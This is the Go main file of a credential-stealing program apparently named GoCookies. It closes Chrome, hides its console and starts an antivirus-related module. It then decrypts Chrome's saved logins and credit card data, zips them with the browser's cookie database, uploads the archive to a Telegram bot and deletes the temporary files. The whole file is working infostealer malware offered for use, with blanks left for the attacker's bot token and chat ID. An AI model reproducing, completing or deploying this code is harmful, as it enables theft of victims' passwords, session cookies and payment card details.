package main

import (
	"GoCookies/modules/antivirus"
	"GoCookies/modules/browsers"
	"GoCookies/modules/hideconsole"
	"GoCookies/utils/fileutil" // Import fileutil
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

const (
	botToken = "" // Replace with your Telegram bot token
	chatID   = ""                                      // Replace with your Telegram chat ID
)

func main() {
	// Step 1: Close Chrome to avoid errors with the database file
	fmt.Println("Closing Chrome browser...")
	browsers.CloseChrome()

	// Step 2: Ensure Chrome is fully closed
	time.Sleep(1 * time.Second)

	// Step 3: Run antivirus and hide console logic
	fmt.Println("Running hideconsole logic")
	go hideconsole.Run()

	fmt.Println("Running antivirus logic")
	go antivirus.Run()

	// Step 4: Get paths for Chrome's Local State, Login Data, Cookies, and Web Data (credit card data)
	browsersMap := browsers.GetChromiumBrowsers()
	chromeLocalStatePath := browsersMap["Chrome Local State"]
	chromeLoginDataPath := browsersMap["Chrome Login Data"]
	chromeCookiesPath := browsersMap["Chrome Login Cookies"]
	creditCardDataPath := browsersMap["Chrome Web Data"] // Ensure correct path here

	// Ensure paths are valid
	if chromeLocalStatePath == "" || chromeLoginDataPath == "" || chromeCookiesPath == "" || creditCardDataPath == "" {
		log.Fatalf("One or more required Chrome paths are not found in the map")
	}

	// Step 5: Get the master key for decryption
	var chromium browsers.Chromium
	err := chromium.GetMasterKey(chromeLocalStatePath)
	if err != nil {
		log.Fatalf("Failed to get master key: %v", err)
	}

	// Step 6: Get login details from the Login Data file
	logins, err := chromium.GetLogins(chromeLoginDataPath)
	if err != nil {
		log.Fatalf("Failed to get logins: %v", err)
	}

	// Step 7: Save login details to a JSON file
	loginFilePath := "logins.json"
	err = saveLoginsToFile(logins, loginFilePath)
	if err != nil {
		log.Fatalf("Failed to save login details to file: %v", err)
	}

	// Step 8: Get credit card details from the Web Data file
	creditCards, err := chromium.GetCreditCards(creditCardDataPath)
	if err != nil {
		log.Fatalf("Failed to get credit card details: %v", err)
	}

	// Step 9: Save credit card details to a JSON file
	creditCardFilePath := "credit_cards.json"
	err = saveCreditCardsToFile(creditCards, creditCardFilePath)
	if err != nil {
		log.Fatalf("Failed to save credit card details to file: %v", err)
	}

	// Step 10: Prepare a map of files to be zipped (login file + cookies file + credit card file)
	filesToZip := map[string]string{
		"logins.json":       loginFilePath,
		"Cookies":           chromeCookiesPath,  // Add cookies directly (not zipped)
		"credit_cards.json": creditCardFilePath, // Add the credit card file
	}

	// Step 11: Zip the files
	finalZipPath := "final_output.zip"
	err = fileutil.ZipFiles(finalZipPath, filesToZip)
	if err != nil {
		log.Fatalf("Failed to zip files: %v", err)
	}

	// Step 12: Send the final zip file to Telegram
	err = sendFileToTelegram(finalZipPath)
	if err != nil {
		log.Fatalf("Failed to send final zip file to Telegram: %v", err)
	}

	// Step 13: Clean up the temporary files after sending
	err = cleanupFiles([]string{loginFilePath, creditCardFilePath, finalZipPath})
	if err != nil {
		log.Printf("Error cleaning up files: %v", err)
	}

	log.Println("All files sent successfully to Telegram and cleaned up.")
}

// saveLoginsToFile saves login details to a JSON file.
func saveLoginsToFile(logins []browsers.Login, filePath string) error {
	// Convert login details to a format that can be marshaled into JSON
	var loginDetails []map[string]string
	for _, login := range logins {
		loginDetails = append(loginDetails, map[string]string{
			"LoginURL": login.LoginURL,
			"Username": login.Username,
			"Password": login.Password,
		})
	}

	// Marshal the login details to JSON
	jsonData, err := json.MarshalIndent(loginDetails, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal logins to JSON: %v", err)
	}

	// Write the JSON data to the file
	err = os.WriteFile(filePath, jsonData, 0644)
	if err != nil {
		return fmt.Errorf("failed to write to file: %v", err)
	}

	log.Printf("Login details saved to %s", filePath)
	return nil
}

// saveCreditCardsToFile saves credit card details to a JSON file.
func saveCreditCardsToFile(creditCards []browsers.CreditCard, filePath string) error {
	// Convert credit card details to a format that can be marshaled into JSON
	var creditCardDetails []map[string]string
	for _, card := range creditCards {
		creditCardDetails = append(creditCardDetails, map[string]string{
			"Name":            card.Name,
			"ExpirationYear":  card.ExpirationYear,
			"ExpirationMonth": card.ExpirationMonth,
			"Address":         card.Address,
			"CardNumber":      card.Number,
		})
	}

	// Marshal the credit card details to JSON
	jsonData, err := json.MarshalIndent(creditCardDetails, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal credit cards to JSON: %v", err)
	}

	// Write the JSON data to the file
	err = os.WriteFile(filePath, jsonData, 0644)
	if err != nil {
		return fmt.Errorf("failed to write to file: %v", err)
	}

	log.Printf("Credit card details saved to %s", filePath)
	return nil
}

// sendFileToTelegram sends a file to Telegram as a document.
func sendFileToTelegram(filePath string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	// Prepare a buffer to hold the multipart form data
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)

	// Create a form file field and write the file content
	formFile, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	// Copy the file content to the form field
	_, err = io.Copy(formFile, file)
	if err != nil {
		return fmt.Errorf("failed to copy file content: %v", err)
	}

	// Add the chat_id field
	err = writer.WriteField("chat_id", chatID)
	if err != nil {
		return fmt.Errorf("failed to write chat_id field: %v", err)
	}

	// Close the writer to finalize the form data
	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close multipart writer: %v", err)
	}

	// Send the POST request to Telegram's API with the form data
	resp, err := http.Post(url, writer.FormDataContentType(), &requestBody)
	if err != nil {
		return fmt.Errorf("failed to send POST request to Telegram: %v", err)
	}
	defer resp.Body.Close()

	// Check if the request was successful
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("received non-OK response from Telegram API: %v", resp.Status)
	}

	log.Printf("File sent successfully to Telegram: %s", filePath)
	return nil
}

// cleanupFiles removes the specified files from the filesystem
func cleanupFiles(filePaths []string) error {
	for _, filePath := range filePaths {
		err := os.Remove(filePath)
		if err != nil {
			return fmt.Errorf("failed to delete file %s: %v", filePath, err)
		}
		log.Printf("Successfully deleted file: %s", filePath)
	}
	return nil
}
